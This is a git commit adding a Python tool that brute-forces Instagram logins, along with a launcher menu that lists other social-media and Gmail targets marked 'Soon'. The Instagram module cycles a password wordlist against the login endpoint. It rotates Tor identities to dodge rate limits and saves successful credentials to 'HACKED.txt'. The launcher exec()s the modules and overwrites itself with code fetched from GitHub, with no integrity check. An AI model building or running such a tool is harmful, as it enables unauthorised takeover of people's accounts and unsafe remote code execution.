1c8c3ecc96754b711cf8e9b23071839c24f9c3d8
Titzn <139163394+Titzn@users.noreply.github.com>
2024-01-28 21:59:59 +0100

    Add files via upload

---
+++ data/instagram.py
@@ -0,0 +1,125 @@
+import requests
+import threading
+import time
+import os
+import re  # Add this line to import the 're' module
+from datetime import datetime
+from stem import Signal
+from stem.control import Controller
+import sys
+
+class InstaBrute:
+    def __init__(self):
+        self.use_tor = False
+        self.start()
+
+    def start(self):
+        try:
+            user = self.get_valid_username()
+            combo_path = input('WORDLIST PATH: ')
+            print("""
+  _____           _                                     __                   
+ |_   _|         | |                                   / _|                  
+   | |  _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___   | |_ ___  _ __ ___ ___ 
+   | | | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \  |  _/ _ \| '__/ __/ _ /
+  _| |_| | | \__ \ || (_| | (_| | | | (_| | | | | | | | || (_) | | | (_|  __/
+ |_____|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_| |_| \___/|_|  \___\___|
+                            __/ |                                            
+                           |___/                                             
+""")
+        except KeyboardInterrupt:
+            print('The tool was interrupted. Exiting...')
+            sys.exit()
+        except Exception as e:
+            print(f"An error occurred: {str(e)}")
+            sys.exit(1)
+
+        tor_use = input('Do you want to use Tor? (y/n): ')
+        if tor_use.lower() == 'y':
+            self.use_tor = True
+            self.start_tor()
+
+        self.load_wordlist(combo_path, user)
+
+    def get_valid_username(self):
+        while True:
+            user = input('INSTAGRAM USERNAME: ')
+            # Perform a simple check for a valid Instagram username
+            if re.match("^[a-zA-Z0-9_]{1,30}$", user):
+                print("Valid Instagram username.")
+                return user
+            else:
+                print("Invalid Instagram username. Please enter a valid username.")
+
+    def start_tor(self):
+        os.system("tor &")
+        time.sleep(5)
+
+    def load_wordlist(self, combo_path, user):
+        with open(combo_path, 'r') as file:
+            password_list = file.read().splitlines()
+
+        threads = []
+        for password in password_list:
+            thread = threading.Thread(target=self.new_brute, args=(user, password))
+            thread.start()
+            threads.append(thread)
+            time.sleep(0.9)
+
+        for t in threads:
+            t.join()
+
+    def new_brute(self, user, password):
+        link = 'https://www.instagram.com/accounts/login/'
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+        time_stamp = int(datetime.now().timestamp())
+
+        payload = {
+            'username': user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{password}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        with requests.Session() as s:
+            if self.use_tor:
+                s.proxies = {
+                    'http': 'socks5://127.0.0.1:9050',
+                    'https': 'socks5://127.0.0.1:9050'
+                }
+
+            r = s.get(link)
+            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
+            r = s.post(login_url, data=payload, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": csrf
+            })
+            
+            print(f'{user}:{password}\nTRYING===============ATTACKING')
+
+            if 'authenticated": true' in r.text:
+                print("[+] Password [{}] is Correct :)".format(password))
+                with open('HACKED.txt', 'a') as file:
+                    file.write(user + ':' + password + '\n')
+            elif 'two_factor_required' in r.text:
+                print("[!] Warning: This account uses 2F Authentication: It's Locked!!!")
+                with open('2FAVerify.txt', 'a') as file:
+                    file.write(user + ':' + password + '\n')
+
+            if self.use_tor:
+                self.change_ip()
+                time.sleep(5)
+
+    def change_ip(self):
+        with Controller.from_port(port=9051) as controller:
+            controller.authenticate()
+            controller.signal(Signal.NEWNYM)
+
+if __name__ == "__main__":
+    try:
+        InstaBrute()
+    except Exception as e:
+        print(f"An error occurred during instantiation: {str(e)}")
---
+++ force.py
@@ -0,0 +1,107 @@
+# Add this import statement at the beginning of your force.py script
+import re
+import threading
+import sys
+import requests
+import hashlib
+import os
+import smtplib
+import colorama
+from colorama import Fore
+import time
+from tqdm import tqdm
+colorama.init()
+
+
+def print_separator():
+    print(">------------------------------------------------------<")
+
+def check_for_updates():
+    url = "https://raw.githubusercontent.com/Titzn/Brut-force-SocialMedia/main/force.py"
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        remote_code = response.text
+        
+        with open(__file__, 'r', encoding='utf-8', newline='') as file:
+            local_code = file.read()
+        
+        if hashlib.sha256(remote_code.encode()).hexdigest() != hashlib.sha256(local_code.encode()).hexdigest():
+            print("Updating the script...")
+            with open(__file__, 'w', encoding='utf-8', newline='') as file:
+                file.write(remote_code)
+            print("Update successful. Please restart the program.")
+            time.sleep(1)
+            for i in range(3, 0, -1):
+                print(i)
+                time.sleep(1)
+            print("Restarting")
+            exit()
+        else:
+            print(Fore.GREEN + "The script is up to date.")
+    else:
+        print(f"Failed to check for updates. Status Code: {response.status_code}")
+
+def run_script(script_path):
+    if os.path.exists(script_path):
+        with open(script_path, 'r', encoding='utf-8', newline='') as file:
+            script_content = file.read()
+        exec(script_content)
+    else:
+        print(f"Error: Script not found at {script_path}")
+
+def run_selected_script(script_dict, user_choice):
+    if user_choice in script_dict:
+        run_script(script_dict[user_choice])
+    else:
+        print("Invalid choice. Please choose a valid number.")
+
+def main():
+    check_for_updates()
+
+    print(Fore.GREEN + """
+
+                     vprebeta[0.1]
+ ______  ____  ______   ____  ____       ____   ____  __ __  ______    ___        _____   ___   ____      __    ___ 
+|      ||    ||      | /    ||    \     |    \ |    \|  |  ||      |  /  _]      |     | /   \ |    \    /  ]  /  _]
+|      | |  | |      ||  o  ||  _  |    |  o  )|  D  )  |  ||      | /  [_ _____ |   __||     ||  D  )  /  /  /  [_ 
+|_|  |_| |  | |_|  |_||     ||  |  |    |     ||    /|  |  ||_|  |_||    _]     ||  |_  |  O  ||    /  /  /  |    _]
+  |  |   |  |   |  |  |  _  ||  |  |    |  O  ||    \|  :  |  |  |  |   [_|_____||   _] |     ||    \ /   \_ |   [_ 
+  |  |   |  |   |  |  |  |  ||  |  |    |     ||  .  \     |  |  |  |     |      |  |   |     ||  .  \\     ||     |
+  |__|  |____|  |__|  |__|__||__|__|    |_____||__|\_|\__,_|  |__|  |_____|      |__|    \___/ |__|\_| \____||_____|
+                                   [+]Github: https://github.com/Titzn/                                                                                  
+                                                                                                          
+    """ + Fore.RESET)
+
+    frames = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"]
+    for _ in tqdm(range(5), desc=Fore.RED + "Loading modules...", ascii=False, ncols=75):
+        time.sleep(0.1)
+
+    script_dict = {
+        "1": os.path.join("data", "instagram.py"),
+        "2": os.path.join("data", "tiktok.py"),
+        "3": os.path.join("data", "snapchat.py"),
+        "4": os.path.join("data", "leboncoin.py"),
+        "5": os.path.join("data", "ebay.py"),
+        "6": os.path.join("data", "vinted.py"),
+        "7": os.path.join("data", "gmail.py"),
+    }
+
+    print_separator()
+    print(f"{Fore.BLUE}     [1] Instagram               {Fore.BLUE}[5] Ebay(Soon)")
+    print(f"{Fore.LIGHTCYAN_EX}     [2] Tiktok(Soon)            {Fore.LIGHTCYAN_EX}[6] Vinted(Soon)")
+    print(f"{Fore.CYAN}     [3] Snapchat(Soon)          {Fore.CYAN}[7] Gmail(Soon)")
+    print(f"{Fore.MAGENTA}     [4] Leboncoin(Soon)         {Fore.MAGENTA}[8] Options" + Fore.RESET)
+    print_separator()
+
+    user_choice = input(Fore.YELLOW + "\nPlease choose a number: " + Fore.RESET)
+
+    if user_choice == "8":
+        print("You have chosen Options")
+        # Add specific code for the Options here
+
+    else:
+        run_selected_script(script_dict, user_choice)
+
+if __name__ == "__main__":
+    main()
